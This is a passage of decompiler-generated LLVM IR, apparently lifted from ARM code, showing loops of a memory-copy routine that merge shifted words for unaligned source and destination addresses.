  %v3_1676c = load i32, i32* @r4, align 4
  store i32 %v3_1676c, i32* %stack_var_-16, align 4
  %v6_1676c = load i32, i32* @r5, align 4
  store i32 %v6_1676c, i32* %stack_var_-12, align 4
  br label %dec_label_pc_16770

dec_label_pc_16770:                               ; preds = %dec_label_pc_16770.dec_label_pc_16770_crit_edge, %dec_label_pc_16768
  %v0_16794 = phi i32 [ %v12_16794, %dec_label_pc_16770.dec_label_pc_16770_crit_edge ], [ %v0_1686c76, %dec_label_pc_16768 ]
  %v0_16774 = phi i32 [ %v0_16774.pre, %dec_label_pc_16770.dec_label_pc_16770_crit_edge ], [ %v4_16750, %dec_label_pc_16768 ]
  %v0_16770 = phi i32 [ %v0_16770.pre, %dec_label_pc_16770.dec_label_pc_16770_crit_edge ], [ %v2_16750, %dec_label_pc_16768 ]
  %v3_16770 = udiv i32 %v0_16770, 256
  %v1_16774 = inttoptr i32 %v0_16774 to i32*
  %v2_16774 = load i32, i32* %v1_16774, align 4
  store i32 %v2_16774, i32* %r4.global-to-local, align 4
  %v3_16774 = add i32 %v0_16774, 4
  %v4_16774 = inttoptr i32 %v3_16774 to i32*
  %v5_16774 = load i32, i32* %v4_16774, align 4
  store i32 %v5_16774, i32* %r5.global-to-local, align 4
  %v6_16774 = add i32 %v0_16774, 8
  %v7_16774 = inttoptr i32 %v6_16774 to i32*
  %v8_16774 = load i32, i32* %v7_16774, align 4
  store i32 %v8_16774, i32* %ip.global-to-local, align 4
  %v9_16774 = add i32 %v0_16774, 12
  %v10_16774 = inttoptr i32 %v9_16774 to i32*
  %v11_16774 = load i32, i32* %v10_16774, align 4
  store i32 %v11_16774, i32* %lr.global-to-local, align 4
  %v12_16774 = add i32 %v0_16774, 16
  store i32 %v12_16774, i32* %r1.global-to-local, align 4
  %v4_16778 = mul i32 %v2_16774, 16777216
  %v5_16778 = or i32 %v4_16778, %v3_16770
  store i32 %v5_16778, i32* @r3, align 4
  %v3_1677c = udiv i32 %v2_16774, 256
  %v4_16780 = mul i32 %v5_16774, 16777216
  %v5_16780 = or i32 %v4_16780, %v3_1677c
  store i32 %v5_16780, i32* %r4.global-to-local, align 4
  %v3_16784 = udiv i32 %v5_16774, 256
  %v4_16788 = mul i32 %v8_16774, 16777216
  %v5_16788 = or i32 %v4_16788, %v3_16784
  store i32 %v5_16788, i32* %r5.global-to-local, align 4
  %v3_1678c = udiv i32 %v8_16774, 256
  %v4_16790 = mul i32 %v11_16774, 16777216
  %v5_16790 = or i32 %v4_16790, %v3_1678c
  store i32 %v5_16790, i32* @ip, align 4
  %v1_16794 = inttoptr i32 %v0_16794 to i32*
  store i32 %v5_16778, i32* %v1_16794, align 4
  %v3_16794 = add i32 %v0_16794, 4
  %v4_16794 = inttoptr i32 %v3_16794 to i32*
  %v5_16794 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_16794, i32* %v4_16794, align 4
  %v6_16794 = add i32 %v0_16794, 8
  %v7_16794 = inttoptr i32 %v6_16794 to i32*
  %v8_16794 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_16794, i32* %v7_16794, align 4
  %v9_16794 = add i32 %v0_16794, 12
  %v10_16794 = inttoptr i32 %v9_16794 to i32*
  %v11_16794 = load i32, i32* @ip, align 4
  store i32 %v11_16794, i32* %v10_16794, align 4
  %v12_16794 = add i32 %v0_16794, 16
  store i32 %v12_16794, i32* @r0, align 4
  %v0_16798 = load i32, i32* %r2.global-to-local, align 4
  %v1_16798 = add i32 %v0_16798, -16
  store i32 %v1_16798, i32* %r2.global-to-local, align 4
  %v3_16798 = sub i32 15, %v0_16798
  %v4_16798 = and i32 %v3_16798, %v0_16798
  %v5_16798 = icmp slt i32 %v4_16798, 0
  %v6_16798 = icmp slt i32 %v1_16798, 0
  %v2_1679c = xor i1 %v6_16798, %v5_16798
  br i1 %v2_1679c, label %dec_label_pc_167a0, label %dec_label_pc_16770.dec_label_pc_16770_crit_edge

dec_label_pc_16770.dec_label_pc_16770_crit_edge:  ; preds = %dec_label_pc_16770
  %v0_16770.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_16774.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_16770

dec_label_pc_167a0:                               ; preds = %dec_label_pc_16770
  %v2_167a0 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_167a0, i32* @r4, align 4
  %v5_167a0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_167a0, i32* @r5, align 4
  %v1_167a4 = add i32 %v0_16798, -4
  store i32 %v1_167a4, i32* %r2.global-to-local, align 4
  %v3_167a4 = add i32 %v0_16798, 2147483632
  %v4_167a4 = and i32 %v1_167a4, %v3_167a4
  %v5_167a4 = icmp slt i32 %v4_167a4, 0
  store i1 %v5_167a4, i1* %cpsr_v.global-to-local, align 1
  %v6_167a4 = icmp slt i32 %v1_167a4, 0
  store i1 %v6_167a4, i1* %cpsr_n.global-to-local, align 1
  %v7_167a4 = icmp eq i32 %v1_167a4, 0
  store i1 %v7_167a4, i1* %cpsr_z.global-to-local, align 1
  %v2_167a8 = xor i1 %v6_167a4, %v5_167a4
  br i1 %v2_167a8, label %dec_label_pc_167c4, label %dec_label_pc_167ac

dec_label_pc_167ac:                               ; preds = %dec_label_pc_167a0, %dec_label_pc_16760, %dec_label_pc_167ac
  %v1_167b8 = phi i32 [ %v4_167b8, %dec_label_pc_167ac ], [ %v12_16794, %dec_label_pc_167a0 ], [ %v0_1686c76, %dec_label_pc_16760 ]
  %v0_167ac = load i32, i32* %lr.global-to-local, align 4
  %v3_167ac = udiv i32 %v0_167ac, 256
  store i32 %v3_167ac, i32* %ip.global-to-local, align 4
  %v0_167b0 = load i32, i32* %r1.global-to-local, align 4
  %v1_167b0 = inttoptr i32 %v0_167b0 to i32*
  %v2_167b0 = load i32, i32* %v1_167b0, align 4
  store i32 %v2_167b0, i32* %lr.global-to-local, align 4
  %v4_167b0 = add i32 %v0_167b0, 4
  store i32 %v4_167b0, i32* %r1.global-to-local, align 4
  %v4_167b4 = mul i32 %v2_167b0, 16777216
  %v5_167b4 = or i32 %v4_167b4, %v3_167ac
  store i32 %v5_167b4, i32* @ip, align 4
  %v2_167b8 = inttoptr i32 %v1_167b8 to i32*
  store i32 %v5_167b4, i32* %v2_167b8, align 4
  %v3_167b8 = load i32, i32* @r0, align 4
  %v4_167b8 = add i32 %v3_167b8, 4
  store i32 %v4_167b8, i32* @r0, align 4
  %v0_167bc = load i32, i32* %r2.global-to-local, align 4
  %v1_167bc = add i32 %v0_167bc, -4
  store i32 %v1_167bc, i32* %r2.global-to-local, align 4
  %v3_167bc = sub i32 3, %v0_167bc
  %v4_167bc = and i32 %v3_167bc, %v0_167bc
  %v5_167bc = icmp slt i32 %v4_167bc, 0
  %v6_167bc = icmp slt i32 %v1_167bc, 0
  %v2_167c0 = xor i1 %v6_167bc, %v5_167bc
  br i1 %v2_167c0, label %dec_label_pc_167c4.loopexit, label %dec_label_pc_167ac

dec_label_pc_167c4.loopexit:                      ; preds = %dec_label_pc_167ac
  %v7_167bc = icmp eq i32 %v0_167bc, 4
  store i1 %v5_167bc, i1* %cpsr_v.global-to-local, align 1
  store i1 %v6_167bc, i1* %cpsr_n.global-to-local, align 1
  store i1 %v7_167bc, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_167c4

dec_label_pc_167c4:                               ; preds = %dec_label_pc_167c4.loopexit, %dec_label_pc_167a0
  %v0_166ec59 = phi i32 [ %v1_167bc, %dec_label_pc_167c4.loopexit ], [ %v1_167a4, %dec_label_pc_167a0 ]
  %v0_167c4 = load i32, i32* %r1.global-to-local, align 4
  %v1_167c4 = add i32 %v0_167c4, -3
  store i32 %v1_167c4, i32* @r1, align 4
  br label %bb140

dec_label_pc_167cc:                               ; preds = %dec_label_pc_1674c
  br i1 %v2_167d0, label %dec_label_pc_16818, label %dec_label_pc_167d4

dec_label_pc_167d4:                               ; preds = %dec_label_pc_167cc
  store i32 %v1_167cc, i32* %r2.global-to-local, align 4
  %v3_167d8 = load i32, i32* @r4, align 4
  store i32 %v3_167d8, i32* %stack_var_-16, align 4
  %v6_167d8 = load i32, i32* @r5, align 4
  store i32 %v6_167d8, i32* %stack_var_-12, align 4
  br label %dec_label_pc_167dc

dec_label_pc_167dc:                               ; preds = %dec_label_pc_167dc.dec_label_pc_167dc_crit_edge, %dec_label_pc_167d4
  %v0_16800 = phi i32 [ %v12_16800, %dec_label_pc_167dc.dec_label_pc_167dc_crit_edge ], [ %v0_1686c76, %dec_label_pc_167d4 ]
  %v0_167e0 = phi i32 [ %v0_167e0.pre, %dec_label_pc_167dc.dec_label_pc_167dc_crit_edge ], [ %v4_16750, %dec_label_pc_167d4 ]
  %v0_167dc = phi i32 [ %v0_167dc.pre, %dec_label_pc_167dc.dec_label_pc_167dc_crit_edge ], [ %v2_16750, %dec_label_pc_167d4 ]
  %v3_167dc = udiv i32 %v0_167dc, 65536
  %v1_167e0 = inttoptr i32 %v0_167e0 to i32*
  %v2_167e0 = load i32, i32* %v1_167e0, align 4
  store i32 %v2_167e0, i32* %r4.global-to-local, align 4
  %v3_167e0 = add i32 %v0_167e0, 4
  %v4_167e0 = inttoptr i32 %v3_167e0 to i32*
  %v5_167e0 = load i32, i32* %v4_167e0, align 4
  store i32 %v5_167e0, i32* %r5.global-to-local, align 4
  %v6_167e0 = add i32 %v0_167e0, 8
  %v7_167e0 = inttoptr i32 %v6_167e0 to i32*
  %v8_167e0 = load i32, i32* %v7_167e0, align 4
  store i32 %v8_167e0, i32* %ip.global-to-local, align 4
  %v9_167e0 = add i32 %v0_167e0, 12
  %v10_167e0 = inttoptr i32 %v9_167e0 to i32*
  %v11_167e0 = load i32, i32* %v10_167e0, align 4
  store i32 %v11_167e0, i32* %lr.global-to-local, align 4
  %v12_167e0 = add i32 %v0_167e0, 16
  store i32 %v12_167e0, i32* %r1.global-to-local, align 4
  %v4_167e4 = mul i32 %v2_167e0, 65536
  %v5_167e4 = or i32 %v4_167e4, %v3_167dc
  store i32 %v5_167e4, i32* @r3, align 4
  %v3_167e8 = udiv i32 %v2_167e0, 65536
  %v4_167ec = mul i32 %v5_167e0, 65536
  %v5_167ec = or i32 %v4_167ec, %v3_167e8
  store i32 %v5_167ec, i32* %r4.global-to-local, align 4
  %v3_167f0 = udiv i32 %v5_167e0, 65536
  %v4_167f4 = mul i32 %v8_167e0, 65536
  %v5_167f4 = or i32 %v4_167f4, %v3_167f0
  store i32 %v5_167f4, i32* %r5.global-to-local, align 4
  %v3_167f8 = udiv i32 %v8_167e0, 65536
  %v4_167fc = mul i32 %v11_167e0, 65536
  %v5_167fc = or i32 %v4_167fc, %v3_167f8
  store i32 %v5_167fc, i32* @ip, align 4
  %v1_16800 = inttoptr i32 %v0_16800 to i32*
  store i32 %v5_167e4, i32* %v1_16800, align 4
  %v3_16800 = add i32 %v0_16800, 4
  %v4_16800 = inttoptr i32 %v3_16800 to i32*
  %v5_16800 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_16800, i32* %v4_16800, align 4
  %v6_16800 = add i32 %v0_16800, 8
  %v7_16800 = inttoptr i32 %v6_16800 to i32*
  %v8_16800 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_16800, i32* %v7_16800, align 4
  %v9_16800 = add i32 %v0_16800, 12
  %v10_16800 = inttoptr i32 %v9_16800 to i32*
  %v11_16800 = load i32, i32* @ip, align 4
  store i32 %v11_16800, i32* %v10_16800, align 4
  %v12_16800 = add i32 %v0_16800, 16
  store i32 %v12_16800, i32* @r0, align 4
  %v0_16804 = load i32, i32* %r2.global-to-local, align 4
  %v1_16804 = add i32 %v0_16804, -16
  store i32 %v1_16804, i32* %r2.global-to-local, align 4
  %v3_16804 = sub i32 15, %v0_16804
  %v4_16804 = and i32 %v3_16804, %v0_16804
  %v5_16804 = icmp slt i32 %v4_16804, 0
  %v6_16804 = icmp slt i32 %v1_16804, 0
  %v2_16808 = xor i1 %v6_16804, %v5_16804
  br i1 %v2_16808, label %dec_label_pc_1680c, label %dec_label_pc_167dc.dec_label_pc_167dc_crit_edge

dec_label_pc_167dc.dec_label_pc_167dc_crit_edge:  ; preds = %dec_label_pc_167dc
  %v0_167dc.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_167e0.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_167dc

dec_label_pc_1680c:                               ; preds = %dec_label_pc_167dc
  %v2_1680c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1680c, i32* @r4, align 4
  %v5_1680c = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_1680c, i32* @r5, align 4
  %v1_16810 = add i32 %v0_16804, -4
  store i32 %v1_16810, i32* %r2.global-to-local, align 4
  %v3_16810 = add i32 %v0_16804, 2147483632
  %v4_16810 = and i32 %v1_16810, %v3_16810
  %v5_16810 = icmp slt i32 %v4_16810, 0
  store i1 %v5_16810, i1* %cpsr_v.global-to-local, align 1
  %v6_16810 = icmp slt i32 %v1_16810, 0
  store i1 %v6_16810, i1* %cpsr_n.global-to-local, align 1
  %v7_16810 = icmp eq i32 %v1_16810, 0
  store i1 %v7_16810, i1* %cpsr_z.global-to-local, align 1
  %v2_16814 = xor i1 %v6_16810, %v5_16810
  br i1 %v2_16814, label %dec_label_pc_16830, label %dec_label_pc_16818

dec_label_pc_16818:                               ; preds = %dec_label_pc_1680c, %dec_label_pc_167cc, %dec_label_pc_16818
  %v1_16824 = phi i32 [ %v4_16824, %dec_label_pc_16818 ], [ %v12_16800, %dec_label_pc_1680c ], [ %v0_1686c76, %dec_label_pc_167cc ]
  %v0_16818 = load i32, i32* %lr.global-to-local, align 4
  %v3_16818 = udiv i32 %v0_16818, 65536
  store i32 %v3_16818, i32* %ip.global-to-local, align 4
  %v0_1681c = load i32, i32* %r1.global-to-local, align 4
  %v1_1681c = inttoptr i32 %v0_1681c to i32*
  %v2_1681c = load i32, i32* %v1_1681c, align 4
  store i32 %v2_1681c, i32* %lr.global-to-local, align 4
  %v4_1681c = add i32 %v0_1681c, 4
  store i32 %v4_1681c, i32* %r1.global-to-local, align 4
  %v4_16820 = mul i32 %v2_1681c, 65536
  %v5_16820 = or i32 %v4_16820, %v3_16818
  store i32 %v5_16820, i32* @ip, align 4
  %v2_16824 = inttoptr i32 %v1_16824 to i32*
  store i32 %v5_16820, i32* %v2_16824, align 4
  %v3_16824 = load i32, i32* @r0, align 4
  %v4_16824 = add i32 %v3_16824, 4
  store i32 %v4_16824, i32* @r0, align 4
  %v0_16828 = load i32, i32* %r2.global-to-local, align 4
  %v1_16828 = add i32 %v0_16828, -4
  store i32 %v1_16828, i32* %r2.global-to-local, align 4
  %v3_16828 = sub i32 3, %v0_16828
  %v4_16828 = and i32 %v3_16828, %v0_16828
  %v5_16828 = icmp slt i32 %v4_16828, 0
  %v6_16828 = icmp slt i32 %v1_16828, 0
  %v2_1682c = xor i1 %v6_16828, %v5_16828
  br i1 %v2_1682c, label %dec_label_pc_16830.loopexit, label %dec_label_pc_16818

dec_label_pc_16830.loopexit:                      ; preds = %dec_label_pc_16818
  %v7_16828 = icmp eq i32 %v0_16828, 4
  store i1 %v5_16828, i1* %cpsr_v.global-to-local, align 1
  store i1 %v6_16828, i1* %cpsr_n.global-to-local, align 1
  store i1 %v7_16828, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_16830

dec_label_pc_16830:                               ; preds = %dec_label_pc_16830.loopexit, %dec_label_pc_1680c
  %v0_166ec60 = phi i32 [ %v1_16828, %dec_label_pc_16830.loopexit ], [ %v1_16810, %dec_label_pc_1680c ]
  %v0_16830 = load i32, i32* %r1.global-to-local, align 4
  %v1_16830 = add i32 %v0_16830, -2
  store i32 %v1_16830, i32* @r1, align 4
  br label %bb140

dec_label_pc_16838:                               ; preds = %dec_label_pc_1674c
  br i1 %v2_167d0, label %dec_label_pc_16884, label %dec_label_pc_16840

dec_label_pc_16840:                               ; preds = %dec_label_pc_16838
  store i32 %v1_167cc, i32* %r2.global-to-local, align 4
  %v3_16844 = load i32, i32* @r4, align 4
  store i32 %v3_16844, i32* %stack_var_-16, align 4
  %v6_16844 = load i32, i32* @r5, align 4
  store i32 %v6_16844, i32* %stack_var_-12, align 4
  br label %dec_label_pc_16848

dec_label_pc_16848:                               ; preds = %dec_label_pc_16848.dec_label_pc_16848_crit_edge, %dec_label_pc_16840
  %v0_1686c = phi i32 [ %v12_1686c, %dec_label_pc_16848.dec_label_pc_16848_crit_edge ], [ %v0_1686c76, %dec_label_pc_16840 ]
  %v0_1684c = phi i32 [ %v0_1684c.pre, %dec_label_pc_16848.dec_label_pc_16848_crit_edge ], [ %v4_16750, %dec_label_pc_16840 ]
  %v0_16848 = phi i32 [ %v0_16848.pre, %dec_label_pc_16848.dec_label_pc_16848_crit_edge ], [ %v2_16750, %dec_label_pc_16840 ]
  %v3_16848 = udiv i32 %v0_16848, 16777216
  %v1_1684c = inttoptr i32 %v0_1684c to i32*
  %v2_1684c = load i32, i32* %v1_1684c, align 4
  store i32 %v2_1684c, i32* %r4.global-to-local, align 4
  %v3_1684c = add i32 %v0_1684c, 4
  %v4_1684c = inttoptr i32 %v3_1684c to i32*
  %v5_1684c = load i32, i32* %v4_1684c, align 4
  store i32 %v5_1684c, i32* %r5.global-to-local, align 4
  %v6_1684c = add i32 %v0_1684c, 8
  %v7_1684c = inttoptr i32 %v6_1684c to i32*
  %v8_1684c = load i32, i32* %v7_1684c, align 4
  store i32 %v8_1684c, i32* %ip.global-to-local, align 4
  %v9_1684c = add i32 %v0_1684c, 12
  %v10_1684c = inttoptr i32 %v9_1684c to i32*
  %v11_1684c = load i32, i32* %v10_1684c, align 4
  store i32 %v11_1684c, i32* %lr.global-to-local, align 4
  %v12_1684c = add i32 %v0_1684c, 16
  store i32 %v12_1684c, i32* %r1.global-to-local, align 4
  %v4_16850 = mul i32 %v2_1684c, 256
  %v5_16850 = or i32 %v4_16850, %v3_16848
  store i32 %v5_16850, i32* @r3, align 4
  %v3_16854 = udiv i32 %v2_1684c, 16777216
  %v4_16858 = mul i32 %v5_1684c, 256
  %v5_16858 = or i32 %v4_16858, %v3_16854
  store i32 %v5_16858, i32* %r4.global-to-local, align 4
  %v3_1685c = udiv i32 %v5_1684c, 16777216
  %v4_16860 = mul i32 %v8_1684c, 256
  %v5_16860 = or i32 %v4_16860, %v3_1685c
  store i32 %v5_16860, i32* %r5.global-to-local, align 4
  %v3_16864 = udiv i32 %v8_1684c, 16777216
  %v4_16868 = mul i32 %v11_1684c, 256
  %v5_16868 = or i32 %v4_16868, %v3_16864
  store i32 %v5_16868, i32* @ip, align 4
  %v1_1686c = inttoptr i32 %v0_1686c to i32*
  store i32 %v5_16850, i32* %v1_1686c, align 4
  %v3_1686c = add i32 %v0_1686c, 4
  %v4_1686c = inttoptr i32 %v3_1686c to i32*
  %v5_1686c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_1686c, i32* %v4_1686c, align 4
  %v6_1686c = add i32 %v0_1686c, 8
  %v7_1686c = inttoptr i32 %v6_1686c to i32*
  %v8_1686c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_1686c, i32* %v7_1686c, align 4
  %v9_1686c = add i32 %v0_1686c, 12
  %v10_1686c = inttoptr i32 %v9_1686c to i32*
  %v11_1686c = load i32, i32* @ip, align 4
  store i32 %v11_1686c, i32* %v10_1686c, align 4
  %v12_1686c = add i32 %v0_1686c, 16
  store i32 %v12_1686c, i32* @r0, align 4
  %v0_16870 = load i32, i32* %r2.global-to-local, align 4
  %v1_16870 = add i32 %v0_16870, -16
  store i32 %v1_16870, i32* %r2.global-to-local, align 4
  %v3_16870 = sub i32 15, %v0_16870
  %v4_16870 = and i32 %v3_16870, %v0_16870
  %v5_16870 = icmp slt i32 %v4_16870, 0
  %v6_16870 = icmp slt i32 %v1_16870, 0
  %v2_16874 = xor i1 %v6_16870, %v5_16870
  br i1 %v2_16874, label %dec_label_pc_16878, label %dec_label_pc_16848.dec_label_pc_16848_crit_edge

dec_label_pc_16848.dec_label_pc_16848_crit_edge:  ; preds = %dec_label_pc_16848
  %v0_16848.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_1684c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_16848

dec_label_pc_16878:                               ; preds = %dec_label_pc_16848
  %v2_16878 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_16878, i32* @r4, align 4
  %v5_16878 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_16878, i32* @r5, align 4
  %v1_1687c = add i32 %v0_16870, -4
  store i32 %v1_1687c, i32* %r2.global-to-local, align 4
  %v3_1687c = add i32 %v0_16870, 2147483632
  %v4_1687c = and i32 %v1_1687c, %v3_1687c
  %v5_1687c = icmp slt i32 %v4_1687c, 0
  store i1 %v5_1687c, i1* %cpsr_v.global-to-local, align 1
  %v6_1687c = icmp slt i32 %v1_1687c, 0
  store i1 %v6_1687c, i1* %cpsr_n.global-to-local, align 1
  %v7_1687c = icmp eq i32 %v1_1687c, 0
  store i1 %v7_1687c, i1* %cpsr_z.global-to-local, align 1
  %v2_16880 = xor i1 %v6_1687c, %v5_1687c
  br i1 %v2_16880, label %dec_label_pc_1689c, label %dec_label_pc_16884

dec_label_pc_16884:                               ; preds = %dec_label_pc_16878, %dec_label_pc_16838, %dec_label_pc_16884
  %v1_16890 = phi i32 [ %v4_16890, %dec_label_pc_16884 ], [ %v12_1686c, %dec_label_pc_16878 ], [ %v0_1686c76, %dec_label_pc_16838 ]
  %v0_16884 = load i32, i32* %lr.global-to-local, align 4
  %v3_16884 = udiv i32 %v0_16884, 16777216
  store i32 %v3_16884, i32* %ip.global-to-local, align 4
  %v0_16888 = load i32, i32* %r1.global-to-local, align 4
  %v1_16888 = inttoptr i32 %v0_16888 to i32*
  %v2_16888 = load i32, i32* %v1_16888, align 4
  store i32 %v2_16888, i32* %lr.global-to-local, align 4
  %v4_16888 = add i32 %v0_16888, 4
  store i32 %v4_16888, i32* %r1.global-to-local, align 4
  %v4_1688c = mul i32 %v2_16888, 256
  %v5_1688c = or i32 %v4_1688c, %v3_16884
  store i32 %v5_1688c, i32* @ip, align 4
  %v2_16890 = inttoptr i32 %v1_16890 to i32*
  store i32 %v5_1688c, i32* %v2_16890, align 4
  %v3_16890 = load i32, i32* @r0, align 4
  %v4_16890 = add i32 %v3_16890, 4
  store i32 %v4_16890, i32* @r0, align 4
  %v0_16894 = load i32, i32* %r2.global-to-local, align 4
  %v1_16894 = add i32 %v0_16894, -4
  store i32 %v1_16894, i32* %r2.global-to-local, align 4
  %v3_16894 = sub i32 3, %v0_16894
  %v4_16894 = and i32 %v3_16894, %v0_16894
  %v5_16894 = icmp slt i32 %v4_16894, 0
  %v6_16894 = icmp slt i32 %v1_16894, 0
  %v2_16898 = xor i1 %v6_16894, %v5_16894
  br i1 %v2_16898, label %dec_label_pc_1689c.loopexit, label %dec_label_pc_16884

dec_label_pc_1689c.loopexit:                      ; preds = %dec_label_pc_16884
  %v7_16894 = icmp eq i32 %v0_16894, 4
  store i1 %v5_16894, i1* %cpsr_v.global-to-local, align 1
  store i1 %v6_16894, i1* %cpsr_n.global-to-local, align 1
  store i1 %v7_16894, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_1689c

dec_label_pc_1689c:                               ; preds = %dec_label_pc_1689c.loopexit, %dec_label_pc_16878
  %v0_166ec61 = phi i32 [ %v1_16894, %dec_label_pc_1689c.loopexit ], [ %v1_1687c, %dec_label_pc_16878 ]
  %v0_1689c = load i32, i32* %r1.global-to-local, align 4
  %v1_1689c = add i32 %v0_1689c, -1
  store i32 %v1_1689c, i32* @r1, align 4
  br label %bb140

dec_label_pc_168a4:                               ; preds = %entry
  %v1_168a4 = load i32, i32* @r2, align 4
  %v2_168a4 = add i32 %v1_168a4, %v0_16650
  store i32 %v2_168a4, i32* %r1.global-to-local, align 4
  %v2_168a8 = add i32 %v1_168a4, %v1_16650
  store i32 %v2_168a8, i32* %r0.global-to-local, align 4
  %v2_168ac = add i32 %v1_168a4, -4
  store i32 %v2_168ac, i32* %r2.global-to-local, align 4
  %v4_168ac = sub i32 3, %v1_168a4
  %v5_168ac = and i32 %v4_168ac, %v1_168a4
  %v6_168ac = icmp slt i32 %v5_168ac, 0
  store i1 %v6_168ac, i1* %cpsr_v.global-to-local, align 1
  %v7_168ac = icmp slt i32 %v2_168ac, 0
  store i1 %v7_168ac, i1* %cpsr_n.global-to-local, align 1
  %v8_168ac = icmp eq i32 %v1_168a4, 4
  store i1 %v8_168ac, i1* %cpsr_z.global-to-local, align 1
  %v5_168b0 = icmp slt i32 %v1_168a4, 4
  br i1 %v5_168b0, label %bb150, label %dec_label_pc_168b4

dec_label_pc_168b4:                               ; preds = %dec_label_pc_168a4
  %v1_168b4 = urem i32 %v2_168a8, 4
  store i32 %v1_168b4, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_168b4 = icmp eq i32 %v1_168b4, 0
  store i1 %v2_168b4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_168b4, label %dec_label_pc_168bc, label %dec_label_pc_1695c

dec_label_pc_168bc:                               ; preds = %dec_label_pc_168b4
  %v1_168bc = urem i32 %v2_168a4, 4
  store i32 %v1_168bc, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_168bc = icmp eq i32 %v1_168bc, 0
  store i1 %v2_168bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_168bc, label %dec_label_pc_168c4, label %dec_label_pc_16988

dec_label_pc_168c4:                               ; preds = %dec_label_pc_168bc, %dec_label_pc_16980
  %v0_168dc37 = phi i32 [ %v2_168a8, %dec_label_pc_168bc ], [ %v0_169d020, %dec_label_pc_16980 ]
  %v0_168d836 = phi i32 [ %v2_168a4, %dec_label_pc_168bc ], [ %v0_16980, %dec_label_pc_16980 ]
  %v0_168c4 = phi i32 [ %v2_168ac, %dec_label_pc_168bc ], [ %v2_16978, %dec_label_pc_16980 ]
  %v2_168c4 = add i32 %v0_168c4, -8
  store i32 %v2_168c4, i32* %r2.global-to-local, align 4
  %v4_168c4 = sub i32 7, %v0_168c4
  %v5_168c4 = and i32 %v4_168c4, %v0_168c4
  %v6_168c4 = icmp slt i32 %v5_168c4, 0
  store i1 %v6_168c4, i1* %cpsr_v.global-to-local, align 1
  %v7_168c4 = icmp slt i32 %v2_168c4, 0
  store i1 %v7_168c4, i1* %cpsr_n.global-to-local, align 1
  %v8_168c4 = icmp eq i32 %v0_168c4, 8
  store i1 %v8_168c4, i1* %cpsr_z.global-to-local, align 1
  %v5_168c8 = icmp slt i32 %v0_168c4, 8
  br i1 %v5_168c8, label %dec_label_pc_16914, label %dec_label_pc_168cc

dec_label_pc_168cc:                               ; preds = %dec_label_pc_168c4
  %v3_168cc = load i32, i32* @r4, align 4
  %v5_168cc = inttoptr i32 %v3_168cc to i8*
  store i8* %v5_168cc, i8** %stack_var_-8, align 4
  %v8_168cc = load i32, i32* @lr, align 4
  %v2_168d0 = add i32 %v0_168c4, -28
  store i32 %v2_168d0, i32* %r2.global-to-local, align 4
  %v4_168d0 = sub i32 27, %v0_168c4
  %v5_168d0 = and i32 %v4_168d0, %v2_168c4
  %v6_168d0 = icmp slt i32 %v5_168d0, 0
  store i1 %v6_168d0, i1* %cpsr_v.global-to-local, align 1
  %v7_168d0 = icmp slt i32 %v2_168d0, 0
  store i1 %v7_168d0, i1* %cpsr_n.global-to-local, align 1
  %v8_168d0 = icmp eq i32 %v2_168c4, 20
  store i1 %v8_168d0, i1* %cpsr_z.global-to-local, align 1
  %v5_168d4 = icmp slt i32 %v2_168c4, 20
  br i1 %v5_168d4, label %dec_label_pc_168f0, label %dec_label_pc_168d8

dec_label_pc_168d8:                               ; preds = %dec_label_pc_168cc, %dec_label_pc_168d8.dec_label_pc_168d8_crit_edge
  %v0_168dc = phi i32 [ %v1_168e4, %dec_label_pc_168d8.dec_label_pc_168d8_crit_edge ], [ %v0_168dc37, %dec_label_pc_168cc ]
  %v0_168d8 = phi i32 [ %v0_168d8.pre, %dec_label_pc_168d8.dec_label_pc_168d8_crit_edge ], [ %v0_168d836, %dec_label_pc_168cc ]
  %v1_168d8 = add i32 %v0_168d8, -4
  %v2_168d8 = inttoptr i32 %v1_168d8 to i32*
  %v3_168d8 = load i32, i32* %v2_168d8, align 4
  %v4_168d8 = add i32 %v0_168d8, -8
  %v5_168d8 = inttoptr i32 %v4_168d8 to i32*
  %v6_168d8 = load i32, i32* %v5_168d8, align 4
  store i32 %v6_168d8, i32* %r4.global-to-local, align 4
  %v7_168d8 = add i32 %v0_168d8, -12
  %v8_168d8 = inttoptr i32 %v7_168d8 to i32*
  %v9_168d8 = load i32, i32* %v8_168d8, align 4
  store i32 %v9_168d8, i32* %ip.global-to-local, align 4
  %v10_168d8 = add i32 %v0_168d8, -16
  %v11_168d8 = inttoptr i32 %v10_168d8 to i32*
  %v12_168d8 = load i32, i32* %v11_168d8, align 4
  store i32 %v12_168d8, i32* %lr.global-to-local, align 4
  store i32 %v10_168d8, i32* %r1.global-to-local, align 4
  %v1_168dc = add i32 %v0_168dc, -16
  %v2_168dc = inttoptr i32 %v1_168dc to i32*
  store i32 %v3_168d8, i32* %v2_168dc, align 4
  %v4_168dc = add i32 %v0_168dc, -12
  %v5_168dc = inttoptr i32 %v4_168dc to i32*
  %v6_168dc = load i32, i32* %r4.global-to-local, align 4
  store i32 %v6_168dc, i32* %v5_168dc, align 4
  %v7_168dc = add i32 %v0_168dc, -8
  %v8_168dc = inttoptr i32 %v7_168dc to i32*
  %v9_168dc = load i32, i32* %ip.global-to-local, align 4
